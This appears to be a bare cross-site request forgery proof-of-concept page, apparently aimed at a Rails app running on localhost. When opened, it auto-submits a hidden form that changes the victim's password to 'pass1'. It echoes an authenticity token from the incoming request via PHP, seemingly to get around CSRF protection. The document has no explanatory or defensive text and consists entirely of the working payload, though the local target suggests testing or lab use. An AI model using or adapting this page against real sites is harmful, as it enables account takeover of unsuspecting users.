<form action="http://localhost:3000/password" method="POST">
  <input name="_method" value="patch">
  <input name="password" value="pass1">
  <input name="password_confirmation" value="pass1">
  <input name="authenticity_token" value="<?php echo htmlspecialchars($_POST['authenticity_token']) ?>">
  <button>submit</button>
</form>
<script>
  document.forms[0].submit()
</script>